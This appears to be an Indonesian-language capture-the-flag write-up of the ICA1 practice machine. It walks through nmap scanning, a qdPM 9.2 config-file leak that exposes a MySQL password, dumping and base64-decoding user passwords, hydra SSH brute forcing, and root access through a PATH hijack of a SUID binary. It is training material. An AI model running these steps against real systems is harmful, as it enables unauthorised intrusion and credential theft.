# Laporan Serangan Server ICA1

Ini adalah hasil serangan yang telah dilakukan pada server ICA1 untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server ICA1: `ping <ip_server>`

## Scan Port Server dengan NMAP
- nmap : `nmap -sC -sV -p- <ip_server>`

**Port** yang terbuka dari server adalah :
- ssh (22)
- http (80)
- mysql (3306) 
- mysqlx (33060)

## Access HTTP (80)
- web login menggunakan qdPM 9.2
- coba cari exploit qdPM 9.2
```
searchsploit qdPM 9.2
```
- jika tidak tersedia maka browse di google (loncat ke terapkan exploit)
- access exploit
```
cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
```
- terapkan exploit : `wget http://<ip_server>/core/config/databases.yml`


## Access MYSQL (3306)
- login mysql : `mysql -u qdpmadmin -h <ip_server> -p`
- password : `UcVQCMQk2STVeS6J`
```
show databases;
```
```
use staff;
```
```
show tables;
```
```
select * from login;
```
```
select password from login;
```
- simpan hasil password pada file : `pass_hash.txt`
- simpan hasil username pada file : `username.txt`
```
select * from user;
```
```
select name from user;
```
- decode hash pada file `pass_hash.txt`
```
while read anangLine; do echo "$anangLine" | base64 --decode; echo ""; done < pass_hash.txt
```
- buat file `pass.txt` yang berisi hasil output decode
- ubah username menjadi lower
```
while read anangLine; do echo "$anangLine" | tr '[:upper:]' '[:lower:]'; done < username.txt
```
- ubah file `username.txt` dengan hasil output





## Access SSH (22)
gunakan hydra untuk  menemukan user dan password
```
hydra -L username.txt -P pass.txt ssh://<ip_server>
```
- login user **travis** : `ssh travis@<ip_server>`
- login juga user **dexter** : `ssh dexter@<ip_server>`
- masing masing password hasil dari hydra
- pada user travis, **flag user**
```
cat user.txt
```
- pada user dexter
```
cat note.txt
```




## Privilege Escalation
- gunakan user **dexter**
- cari yang berhubungan dengan root
```
find / -perm -u=s 2>/dev/null
```
- jalankan
```
/opt/get_access
```
- jika tidak bisa (serivce are disabled), maka ubah path
```
echo $PATH
```
```
echo '/bin/bash' >> /tmp/cat
```
```
export PATH=/tmp:$PATH
```
```
echo $PATH
```
- maka path sudah berubah menjadi `/tmp: . . .`

- ubah mode **myroot**
```
chmod +x /tmp/cat
```
- jalankan get_access lagi
```
/opt/get_access
```
- temukan flag
```
cat /root/root.txt
```
- jika perintah cat tidak bekerja
- copy flag pada home
```
scp /root/root.txt /home/dexter
```
- ubah mode
```
chmod 777 /home/dexter/root.txt
```
- lakukan exit beberapa kali (sampai logout ssh)
```
exit
```
- konesikan ulang ssh
- dan lihat **flag root**
```
cat root.txt
```

**note :** jika mau akses root maka ulangi langkah `Privilege Escalation`